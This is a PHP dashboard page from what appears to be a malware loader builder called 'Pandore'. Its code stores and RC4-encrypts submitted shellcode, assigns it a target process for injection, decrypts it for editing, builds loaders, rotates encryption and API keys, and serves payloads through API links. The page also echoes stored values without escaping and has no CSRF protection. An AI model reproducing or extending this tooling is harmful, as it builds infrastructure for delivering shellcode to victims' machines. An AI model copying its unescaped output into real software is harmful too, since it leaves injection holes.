<?php
if (isset($_SESSION['token'])) {
    unset($_SESSION['token']);
}

redirect();

$payloadName = $shellcode = $process = '';
$error = '';

$payload_array = get_payload();

if (isset($_POST['submit_payload']))
{
    $payloadName = trim($_POST['payload_name']);
    $shellcode = trim($_POST['shellcode']);
    $process = trim($_POST['process']);

    if (empty($payloadName) || empty($shellcode) || empty($process)) 
    {
        $error = 'All fields are required !';
    } 
    else 
    {
        create_payload($payloadName,  $shellcode, $process);
        header("Refresh:0");
    }
}
elseif (isset($_POST['update_process']) && isset($_POST['payload_id']))
{
    $process = trim($_POST['new_process']);
    $payload_id = $_POST['payload_id'];

    if (empty($process)) 
    {
        echo '<script type="text/javascript">window.confirm("All fields are required !");</script>';
    } 
    else 
    {
        update_payload_process($payload_id,  $process);
        header("Refresh:0");
    }
}
elseif (isset($_POST['payload_api']) && isset($_POST['payload_id']))
{
    $payload_id = $_POST['payload_id'];
    $payload_api = $_POST['payload_api'];

    if (isset($_POST['build_loader']))
    {
        echo build_loader($payload_api);
        header("Refresh:0");
    }
    elseif (isset($_POST['new_api']))
    {
        echo new_api_key($payload_id);
        header("Refresh:0");
    }
    elseif (isset($_POST['new_payload']))
    {
        echo new_payload($payload_id);
        header("Refresh:0");
    }
    elseif (isset($_POST['link_payload']))
    {
        echo get_payload_link($payload_api);
    }
    elseif (isset($_POST['delete_payload']))
    {
        delete_payload($payload_id);
        header("Refresh:0");
    }
}

if (isset($_POST['save_payload']))
{
    update_payload_content($_POST['payload_id'], $_POST['new_content']);
    header("Refresh:0");
}

?>

<div class="container">
    <div class="wrapper dashboard-wrapper">
        <div class="dashboard-content">
        <div style="width: 50%; float: left; max-height: 400px; overflow-y: auto;">
                <?php if (empty($payload_array)) : ?>
                    <div class="object-column">
                        <p style="color: #f84040;">⚠️ You don't have any payload !</p>
                    </div>
                <?php else : ?>
                    <?php foreach ($payload_array as $payload) : ?>
                        <form action="?pages=main" method="post">
                        <input type="hidden" name="payload_id" value="<?php echo $payload['id']; ?>">
                        <input type="hidden" name="payload_api" value="<?php echo $payload['api']; ?>">
                        <input class="modal-state" id="modal-<?php echo $payload['id']; ?>" type="checkbox" />
                        <div class="modal">
                            <label class="modal__bg" for="modal-<?php echo $payload['id']; ?>"></label>
                            <div class="modal__inner" style="height: 40%; width: 25%;">
                                <label class="modal__close" for="modal-<?php echo $payload['id']; ?>"></label>
                                <div style="width: 50%; float: left;">
                                    <div style="width : 50%;">
                                    <strong>Editor :</strong><br>
                                    <textarea id="text-editor" name="new_content" style="width: 220%; height: 280px; background-color: var(--second-background-color); color : #ccc;">
                                        <?php 
                                        $shellcode_array = str_to_hex_array($payload['shellcode']);
                                        $key_array = str_to_hex_array($payload['rc4_key']);

                                        $shellcode_array = rc4($shellcode_array, $key_array);

                                        foreach ($key_array as $hexa)
                                        {
                                            $hex_key_array[] = sprintf('0x%02X', $hexa);
                                        }

                                        echo implode(',', $shellcode_array);; 
                                        ?>
                                    </textarea>
                                    <div class="button" style="width: 225%">
                                        <input type="submit" name="save_payload" value="Save">
                                    </div>
                                    </div>
                                </div>
                                <div style="float: right;">
                                    <strong>Actions :</strong><br>
                                    
                                    <div class="row">
                                        <input type="text" name="new_process" placeholder="<?php echo $payload['process']; ?>">          
                                    </div>     

                                    <div class="button">
                                        <input type="submit" name="update_process" value="Update Process Name">
                                    </div>

                                    <div class="button">
                                        <input type="submit" name="build_loader" value="Build Pandore">
                                    </div>

                                    <div class="button">
                                        <input type="submit" name="new_payload" value="Change Payload Encryption">
                                    </div>

                                    <div class="button">
                                        <input type="submit" name="link_payload" value="Get API Payload Link">
                                    </div>

                                    <div class="button">
                                        <input style="background-color: #f84040; border: #f84040; box-shadow: 0 0 5px #f84040;" type="submit" name="new_api" value="Change API Key">
                                    </div>

                                    <div class="button">
                                        <input style="background-color: #f84040; border: #f84040; box-shadow: 0 0 5px #f84040;" type="submit" name="delete_payload" value="Delete Payload">
                                    </div>

                                </div> 
                            </div>      
                    </div>
                    </form>
                        <div class="object-column">
                        <form action="?pages=main" method="post">
                                <p>
                                    <?php echo $payload['title']; ?>
                                    <span class="button-container">
                                        <label class="btn" for="modal-<?php echo $payload['id']; ?>">📝</label>
                                    </span>
                                </p>
                        </form>
                        </div>
                    <?php endforeach; ?>
                <?php endif; ?>
            </div>

            <div style="float: right; width: 45%;">
            <form action="?pages=main" method="post">
                    <div class="row">
                        <input type="text" name="payload_name" placeholder="Payload Name" value="<?php echo htmlspecialchars($payloadName); ?>">
                    </div>
                    <div class="row">
                        <input type="text" name="shellcode" placeholder="Shellcode" value="<?php echo htmlspecialchars($shellcode); ?>">
                    </div>
                    <div class="row">
                        <input type="text" name="process" placeholder="Process" value="<?php echo htmlspecialchars($process); ?>">
                    </div>

                        <div class="button" style="width: 100%;">
                            <input type="submit" name="submit_payload" value="Submit">
                        </div>

                        <div class="button">
                            <input type="button" value="Admin Panel" onclick="window.location.href='?page=admin';">
                        </div>

                        <div class="button">
                            <input style="background-color: #f84040; border: #f84040; box-shadow: 0 0 5px #f84040;" type="button" value="Logout" onclick="window.location.href='?page=logout';">
                        </div>
                </form>

                <?php if (!empty($error)) : ?>
                    <div class="error-message" style="text-align: center;"><?php echo $error; ?></div>
                <?php endif; ?>
            </div>
        </div>
    </div>
</div>
